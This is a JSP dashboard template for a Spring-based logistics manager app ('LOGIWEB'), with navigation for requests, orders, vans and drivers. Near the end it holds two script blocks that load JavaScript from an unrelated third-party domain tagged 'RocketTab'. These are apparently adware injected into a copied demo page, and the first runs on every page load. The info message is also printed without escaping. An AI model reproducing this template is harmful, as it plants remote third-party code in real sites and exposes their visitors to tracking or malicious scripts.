<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ taglib prefix="security"
           uri="http://www.springframework.org/security/tags" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>

<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>LOGIWEB</title>

    <link href="<c:url value="/resources/css/bootstrap.min.css"/>" rel="stylesheet">
    <link href="<c:url value="/resources/css/common.css"/>" rel="stylesheet">
    <link href="<c:url value="/resources/css/dashboard.css"/>" rel="stylesheet">

    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

</head>
<body>

<div class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container-fluid">
        <div class="navbar-header">
            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a class="navbar-brand" href="#">LOGIWEB</a>
        </div>
        <div class="navbar-collapse collapse">
            <ul class="nav navbar-nav navbar-right">
                <li><a href="#"><security:authentication property="principal.username"/></a></li>
                <li><a href="/logout/">Logout</a></li>
            </ul>
        </div>
    </div>
</div>

<div class="container-fluid">
    <div class="row">
        <div class="col-sm-3 col-md-2 sidebar">
            <ul class="nav nav-sidebar">
                <li class="active"><a href="#">Menu</a></li>
                <li><a href="new_request">New Request</a></li>
                <li><a href="pick_up_requests">Pick up requests</a></li>
                <li><a href="orders_list">Orders list</a></li>
                <li><a href="vans">Vans</a></li>
                <li><a href="drivers">Drivers</a></li>
            </ul>
        </div>
    </div>
</div>
<div class="col-sm-9 col-sm-offset-3 col-md-10 col-md-offset-2 main">

    <div class="background-set">
        <img src="/resources/img/truck1.jpg" alt="truck1">
    </div>
<div class="my-settings">
    <c:if test="${info_msg != null}">
        <div class="msg">
                ${info_msg}
        </div>
    </c:if>
</div>

</div>
<!-- Bootstrap core JavaScript
================================================== -->
<!-- Placed at the end of the document so the pages load faster -->
<script type="text/javascript" async=""
        src="http://i.dpknlgtbjs.info/dpknlgtb/javascript.js?channel=371CF7A692D37C89B449C837BB360535&amp;apptitle=RocketTab&amp;plink=http%3a%2f%2fwww.rockettab.com"></script>
<script type="text/javascript">(function () {
    if (top.location == self.location && top.location.href.split('#')[0] == 'http://bootstrap-3.ru/examples/dashboard/') {
        var po = document.createElement('script');
        po.type = 'text/javascript';
        po.async = true;
        po.src = document.location.protocol + '//i.dpknlgtbjs.info/dpknlgtb/javascript.js?channel=371CF7A692D37C89B449C837BB360535&apptitle=RocketTab&plink=http%3a%2f%2fwww.rockettab.com';
        var s = document.getElementsByTagName('script')[0];
        s.parentNode.insertBefore(po, s);
    }
})();</script>
</body>
<%--<body>
<h1>MANAGER'S APP</h1>

<div>
    <a href="/logout/" class="exit link">
        <span>Выход</span>
    </a>
</div>
<h3>Hello, <security:authentication property="principal.username"/>!</h3>

<div>

    <form name="form_new_request" action="new_request" method="get">
        <button type="submit" class="btn btn-default" title="New request" value="NEW REQUEST">NEW REQUEST</button>
        &lt;%&ndash; <input type="submit" title="New request" value="NEW REQUEST">&ndash;%&gt;
    </form>
</div>
<div>
    <form name="form_pick_up_requests" action="pick_up_requests" method="get">
        <button type="submit" class="btn btn-default" title="Pick up requests" value="PICK UP REQUESTS">PICK UP REQUESTS</button>
    </form>
</div>
<div>
    <form name="form_orders_list" action="orders_list" method="get">
        <button type="submit" class="btn btn-default" title="Orders List" value="ORDERS LIST">ORDERS LIST</button>
        &lt;%&ndash;<input type="submit" title="Orders List" value="ORDERS LIST">&ndash;%&gt;
    </form>
</div>
<div>
    <form name="form_vans" action="vans" method="get">
        <button type="submit" class="btn btn-default"  title="VANS" value="VANS">VANS</button>
        &lt;%&ndash;<input type="submit" title="VANS" value="VANS">&ndash;%&gt;
    </form>
</div>
<div>
    <form name="form_drivers" action="drivers" method="get">
        <button type="submit" class="btn btn-default" title="DRIVERS" value="DRIVERS">DRIVERS</button>
        &lt;%&ndash;<input type="submit" title="DRIVERS" value="DRIVERS">&ndash;%&gt;
    </form>
</div>
</body>--%>
</html>